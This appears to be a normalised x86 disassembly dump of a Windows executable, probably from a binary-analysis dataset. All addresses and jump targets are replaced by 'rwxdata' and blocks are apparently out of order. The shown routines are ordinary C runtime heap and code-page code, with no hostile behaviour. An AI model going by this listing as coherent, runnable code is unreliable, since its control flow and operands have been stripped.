cmp ebx [ ebp - 0x4 ]
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov eax [ rwxdata ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov [ rwxdata ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je rwxdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb rwxdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je rwxdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne rwxdata
cmp ebx [ ebp - 0x4 ]
jae rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
test ecx ecx
jl rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle rwxdata
shl ecx 0x1
inc edi
jmp rwxdata
push ebx
call sub_40867b
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne rwxdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp rwxdata
cmp esi edi
je rwxdata
push 0x3f
pop esi
xor eax eax
jmp rwxdata
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
test ecx ecx
je rwxdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4085ca
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne rwxdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp rwxdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je rwxdata
cmp edi 0x20
jge rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne rwxdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge rwxdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp rwxdata
and [ rwxdata ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp rwxdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4085ca
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
push esi
push edi
xor edi edi
cmp eax ecx
jne rwxdata
mov ecx [ rwxdata ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rwxdata ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je rwxdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rwxdata ]
push edi
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je rwxdata
xor eax eax
jmp rwxdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne rwxdata
add [ rwxdata ] 0x10
mov [ rwxdata ] eax
mov eax [ rwxdata ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rwxdata ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rwxdata ]
call [ HeapFree@IAT ]
sub_40867b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp rwxdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne rwxdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne rwxdata
test eax eax
jl rwxdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne rwxdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe rwxdata
sub_408776
cmp [ rwxdata ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne rwxdata
push 0x2020
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je rwxdata
mov esi rwxdata
jmp rwxdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je rwxdata
cmp esi rwxdata
je rwxdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je rwxdata
push esi
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rwxdata
cmp esi eax
jne rwxdata
mov [ esi ] eax
mov eax [ rwxdata ]
mov [ esi + 0x4 ] eax
mov [ rwxdata ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rwxdata ] 0x0
jne rwxdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl rwxdata
push ebx
push 0x0
push edi
call sub_409e10
add esp 0xc
cmp [ rwxdata ] 0x0
jne rwxdata
mov [ rwxdata ] eax
mov eax esi
jmp rwxdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp rwxdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rwxdata ] eax
jmp rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae rwxdata
sub_4088ba
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rwxdata ] esi
jne rwxdata
cmp esi rwxdata
je rwxdata
mov eax [ esi + 0x4 ]
mov [ rwxdata ] eax
or [ rwxdata ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rwxdata ]
call [ HeapFree@IAT ]
pop esi
retn
sub_408910
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
cmp esi [ rwxdata ]
je rwxdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg rwxdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge rwxdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je rwxdata
cmp [ esi + 0x10 ] 0xffffffff
je rwxdata
cmp [ edi ] 0xf0
jne rwxdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je rwxdata
or [ edi ] 0xffffffff
dec [ rwxdata ]
mov eax [ esi + 0xc ]
test eax eax
je rwxdata
cmp [ ecx + 0x18 ] 0xffffffff
jne rwxdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe rwxdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je rwxdata
cmp edx 0x400
jne rwxdata
inc edx
add eax 0x8
cmp edx 0x400
jl rwxdata
push ecx
call sub_4088ba
pop ecx
cmp [ eax ] 0xffffffff
jne rwxdata
sub_4089d2
mov eax [ esp + 0x4 ]
mov edx rwxdata
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je rwxdata
cmp eax [ ecx + 0x14 ]
jb rwxdata
xor eax eax
pop esi
retn
jmp rwxdata
test al 0xf
jne rwxdata
cmp eax [ ecx + 0x10 ]
jbe rwxdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb rwxdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_408a29
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne rwxdata
retn
inc [ rwxdata ]
cmp [ rwxdata ] 0x20
jne rwxdata
push 0x10
call sub_408910
pop ecx
sub_408a6e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae rwxdata
mov eax rwxdata
mov edi eax
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl rwxdata
mov edi [ edi ]
cmp edi eax
je rwxdata
cmp [ edi + 0xc ] 0x0
jne rwxdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je rwxdata
mov esi [ esi ]
cmp esi [ rwxdata ]
je rwxdata
mov eax [ edi ]
cmp eax ebx
jl rwxdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
call sub_408776
test eax eax
je rwxdata
jmp rwxdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne rwxdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
jmp rwxdata
push ebx
push ecx
push eax
call sub_408c76
add esp 0xc
test eax eax
jne rwxdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rwxdata ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp rwxdata
cmp [ edi + 0x10 ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne rwxdata
cmp [ ebp - 0x4 ] 0x10
jge rwxdata
jmp rwxdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_408c76
add esp 0xc
test eax eax
jne rwxdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae rwxdata
mov [ rwxdata ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp rwxdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_409e10
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle rwxdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je rwxdata
mov [ edi + 0x4 ] ebx
mov [ rwxdata ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp rwxdata
cmp [ ecx ] 0xffffffff
je rwxdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne rwxdata
cmp ecx eax
add ecx 0x8
jmp rwxdata
cmp ecx eax
jae rwxdata
sub_408c76
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb rwxdata
add esi edi
cmp [ esi ] 0x0
je rwxdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae rwxdata
lea esi [ eax + edx ]
cmp esi ebx
jae rwxdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp rwxdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne rwxdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp rwxdata
lea eax [ edi + 0x8 ]
jmp rwxdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae rwxdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne rwxdata
cmp esi edx
jae rwxdata
inc ebx
inc esi
jmp rwxdata
movzx eax al
add esi eax
jmp rwxdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
cmp eax [ ebp - 0x4 ]
jne rwxdata
cmp [ ebx ] 0x0
jne rwxdata
cmp esi edi
jae rwxdata
cmp eax edx
jae rwxdata
inc ebx
inc eax
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp rwxdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb rwxdata
mov [ ecx + 0x4 ] esi
jmp rwxdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb rwxdata
cmp [ ebx ] 0x0
jne rwxdata
mov [ eax ] dl
add eax 0x8
jmp rwxdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp rwxdata
mov esi ebx
jmp rwxdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb rwxdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_408d9a
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rwxdata ] ecx
mov eax rwxdata
mov eax [ edx * 8 + rwxdata ]
mov [ rwxdata ] eax
retn
add eax 0x8
inc edx
cmp eax rwxdata
jb rwxdata
cmp ecx [ eax ]
je rwxdata
cmp ecx 0x13
jb rwxdata
cmp ecx 0xbc
jb rwxdata
cmp ecx 0x24
ja rwxdata
mov [ rwxdata ] 0x16
cmp ecx 0xca
mov [ rwxdata ] 0x8
jbe rwxdata
mov [ rwxdata ] 0xd
retn
retn
sub_408e01
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rwxdata ]
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je rwxdata
cmp [ eax ] 0xffffffff
je rwxdata
cmp [ rwxdata ] 0x1
jne rwxdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp rwxdata
xor eax eax
sub ecx eax
je rwxdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je rwxdata
push eax
push 0xfffffff5
jmp rwxdata
dec ecx
jne rwxdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp rwxdata
sub_408e7b
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je rwxdata
mov eax [ eax ]
retn
sub_408eb8
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je rwxdata
push eax
call sub_408e7b
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
retn
mov [ rwxdata ] eax
test eax eax
je rwxdata
sub_408f0f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
cmp esi 0xffffffe0
push edi
mov [ ebp + 0x8 ] esi
ja rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
test esi esi
jne rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_409aa7
test eax eax
pop ecx
je rwxdata
cmp eax 0x2
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp eax [ rwxdata ]
ja rwxdata
xor eax eax
jmp rwxdata
jmp rwxdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
push eax
call sub_4082c1
mov edi eax
pop ecx
test edi edi
jne rwxdata
pop edi
pop esi
pop ebp
retn
mov eax esi
shr eax 0x4
push eax
call sub_408a6e
mov edi eax
pop ecx
test edi edi
jne rwxdata
push [ ebp + 0x8 ]
jmp rwxdata
push esi
jmp rwxdata
push 0x0
push edi
call sub_409e10
add esp 0xc
sub_408fc0
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rwxdata ] esi
jle rwxdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
je rwxdata
inc esi
cmp esi [ rwxdata ]
jl rwxdata
test [ eax + 0xc ] 0x83
je rwxdata
cmp esi 0x14
jl rwxdata
push eax
call sub_405dd5
cmp eax 0xffffffff
pop ecx
je rwxdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
call sub_4068e6
mov eax [ rwxdata ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_409029
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rwxdata ] cl
jne rwxdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je rwxdata
xor eax eax
movzx eax [ eax * 2 + rwxdata ]
and eax [ esp + 0x8 ]
jmp rwxdata
retn
test eax eax
jne rwxdata
sub_40905a
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4091f3
mov esi eax
pop ecx
cmp esi [ rwxdata ]
mov [ ebp + 0x8 ] esi
je rwxdata
xor eax eax
jmp rwxdata
xor ebx ebx
cmp esi ebx
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_409270
xor edx edx
mov eax rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rwxdata ]
add eax 0x30
inc edx
cmp eax rwxdata
jb rwxdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb rwxdata
mov dl [ ecx + 0x1 ]
test dl dl
je rwxdata
cmp [ eax ] esi
je rwxdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
cmp [ ebx ] 0x0
mov ecx ebx
je rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] 0x1
push eax
mov [ rwxdata ] eax
call sub_40923d
lea esi [ esi + rwxdata ]
mov edi rwxdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rwxdata ] eax
movsd [ edi ] [ esi ]
jmp rwxdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja rwxdata
cmp [ rwxdata ] ebx
je rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
cmp [ ebp - 0x18 ] 0x1
mov [ rwxdata ] esi
[ edi ]
stosb [ edi ]
mov [ rwxdata ] ebx
jbe rwxdata
call sub_409299
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne rwxdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rwxdata ]
or eax 0xffffffff
mov [ rwxdata ] ebx
cmp [ ebp - 0x12 ] 0x0
je rwxdata
or [ eax + rwxdata ] dl
inc eax
cmp eax edi
jbe rwxdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rwxdata ] 0x8
inc eax
cmp eax 0xff
jb rwxdata
push esi
call sub_40923d
pop ecx
mov [ rwxdata ] eax
mov [ rwxdata ] 0x1
jmp rwxdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rwxdata
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp rwxdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne rwxdata
or [ eax + rwxdata ] 0x4
inc eax
jmp rwxdata
mov dl [ ecx ]
test dl dl
je rwxdata
cmp eax edx
ja rwxdata
sub_4091f3
mov eax [ esp + 0x4 ]
and [ rwxdata ] 0x0
cmp eax 0xfffffffe
jne rwxdata
cmp eax 0xfffffffd
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rwxdata ]
mov [ rwxdata ] 0x1
sub_40923d
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je rwxdata
mov eax 0x411
retn
sub eax 0x4
je rwxdata
mov eax 0x804
retn
sub eax 0xd
je rwxdata
mov eax 0x412
retn
dec eax
je rwxdata
mov eax 0x404
retn
xor eax eax
retn
sub_409270
push edi
push 0x40
pop ecx
xor eax eax
mov edi rwxdata
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_409299
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rwxdata ]
